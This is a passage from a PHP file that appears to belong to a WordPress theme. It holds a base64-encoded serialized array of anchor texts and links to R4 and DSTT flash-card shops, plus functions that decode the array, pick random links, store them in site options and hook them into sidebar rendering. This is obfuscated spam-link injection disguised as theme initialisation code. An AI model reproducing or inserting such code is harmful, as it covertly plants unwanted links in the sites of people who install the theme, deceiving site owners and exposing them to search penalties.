y5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxMDoicjQgY2FyZCBkcyI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTE6InI0aSBjYXJkIGRzIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTI6InI0IHNkaGMgY2FyZCI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjU6InI0IHVrIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoyOiJyNCI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjExOiJyNCBjYXJkcyB1ayI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjQ6ImxpbmsiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjEwOiJjbGljayBoZXJlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMjoidGhpcyB3ZWJzaXRlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo3OiJ3ZWJzaXRlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo5OiJpcjR1ay5jb20iO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTM6Ind3dy5pcjR1ay5jb20iO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjU6ImlyNHVrIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo3OiJyNCBzaXRlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo1OiJyNCBkcyI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6OToiYnV5IHI0IHVrIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo1OiJjbGljayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NzoidGhpcyByNCI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NToibXkgcjQiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjExOiJyNCBvZmZpY2lhbCI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6OToiYmVzdCBzaXRlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxNDoicmVjb21tZW5kIHRoaXMiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjt9aToyO2E6Njc6e3M6MTE6InI0M2RzdWsuY29tIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjY6InI0LTNkcyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxNToid3d3LnI0M2RzdWsuY29tIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjc6InI0M2RzdWsiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6NzoicjQgaGVyZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTE6ImhlcmUgcjQgM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjExOiJ0aGlzIHI0IDNkcyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxMjoicjRpIHNkaGMgM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjM6InI0aSI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjg6InI0aSBzZGhjIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEyOiJyNCAzZHMgY2FyZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTI6Im5pbnRlbmRvIDNkcyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxMzoicjQgM2RzIHNsb3QgMSI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxMjoicjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjE2OiJ3d3cucjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo3OiJyNCBjYXJkIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo4OiJyNCBjYXJkcyI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjEwOiJyNCBkcyBjYXJkIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo4OiJyNGNhcmR1ayI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTA6InI0IGNhcmQgdWsiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjEwOiJ1ayByNCBjYXJkIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo4OiJyNGkgY2FyZCI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6NDoiaGVyZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6OToidGhpcyBzaXRlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czozOiJ1cmwiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czo5OiJvdmVyIGhlcmUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjg6InRoaXMgb25lIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo0OiJ0aGlzIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTQ6ImRzdHRkaXJlY3QuY29tIjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjEwOiJkc3R0ZGlyZWN0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjQ6ImRzdHQiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6NzoiZHN0dCB1ayI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czoxNjoibmludGVuZG8gZHMgZHN0dCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo4OiJ0aGlzIHVybCI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTM6ImhlcmUgZm9yIGRzdHQiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6OToidGhpcyBkc3R0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjEyOiJkc3R0IGRzIGNhcmQiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6NzoicjQgZHN0dCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo3OiJyNGNhcmRzIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjE3OiJ3d3cucjRjYXJkdWtzLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjEwOiJyNCBjYXJkIGRzIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMToicjRpIGNhcmQgZHMiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxMjoicjQgc2RoYyBjYXJkIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6NToicjQgdWsiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjI6InI0IjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTE6InI0IGNhcmRzIHVrIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6NDoibGluayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTA6ImNsaWNrIGhlcmUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjEyOiJ0aGlzIHdlYnNpdGUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjc6IndlYnNpdGUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjk6ImlyNHVrLmNvbSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMzoid3d3LmlyNHVrLmNvbSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NToiaXI0dWsiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjc6InI0IHNpdGUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjU6InI0IGRzIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo5OiJidXkgcjQgdWsiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjU6ImNsaWNrIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo3OiJ0aGlzIHI0IjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo1OiJteSByNCI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTE6InI0IG9mZmljaWFsIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo5OiJiZXN0IHNpdGUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjE0OiJyZWNvbW1lbmQgdGhpcyI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO31pOjM7YTo2Nzp7czoxMToicjQzZHN1ay5jb20iO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6NjoicjQtM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjE1OiJ3d3cucjQzZHN1ay5jb20iO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6NzoicjQzZHN1ayI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czo3OiJyNCBoZXJlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMToiaGVyZSByNCAzZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTE6InRoaXMgcjQgM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEyOiJyNGkgc2RoYyAzZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MzoicjRpIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6ODoicjRpIHNkaGMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTI6InI0IDNkcyBjYXJkcyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxMjoibmludGVuZG8gM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEzOiJyNCAzZHMgc2xvdCAxIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEyOiJyNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTY6Ind3dy5yNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjc6InI0IGNhcmQiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjg6InI0IGNhcmRzIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTA6InI0IGRzIGNhcmQiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjg6InI0Y2FyZHVrIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxMDoicjQgY2FyZCB1ayI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTA6InVrIHI0IGNhcmQiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjg6InI0aSBjYXJkIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo0OiJoZXJlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo5OiJ0aGlzIHNpdGUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjM6InVybCI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjk6Im92ZXIgaGVyZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6ODoidGhpcyBvbmUiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjQ6InRoaXMiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxNDoiZHN0dGRpcmVjdC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MTA6ImRzdHRkaXJlY3QiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6NDoiZHN0dCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo3OiJkc3R0IHVrIjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjE2OiJuaW50ZW5kbyBkcyBkc3R0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjg6InRoaXMgdXJsIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMzoiaGVyZSBmb3IgZHN0dCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo5OiJ0aGlzIGRzdHQiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MTI6ImRzdHQgZHMgY2FyZCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo3OiJyNCBkc3R0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjc6InI0Y2FyZHMiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTc6Ind3dy5yNGNhcmR1a3MuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTA6InI0IGNhcmQgZHMiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjExOiJyNGkgY2FyZCBkcyI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjEyOiJyNCBzZGhjIGNhcmQiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czo1OiJyNCB1ayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MjoicjQiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxMToicjQgY2FyZHMgdWsiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czo0OiJsaW5rIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMDoiY2xpY2sgaGVyZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTI6InRoaXMgd2Vic2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6Nzoid2Vic2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6OToiaXI0dWsuY29tIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjEzOiJ3d3cuaXI0dWsuY29tIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo1OiJpcjR1ayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NzoicjQgc2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NToicjQgZHMiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjk6ImJ1eSByNCB1ayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NToiY2xpY2siO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjc6InRoaXMgcjQiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjU6Im15IHI0IjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMToicjQgb2ZmaWNpYWwiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjk6ImJlc3Qgc2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTQ6InJlY29tbWVuZCB0aGlzIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7fX0="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>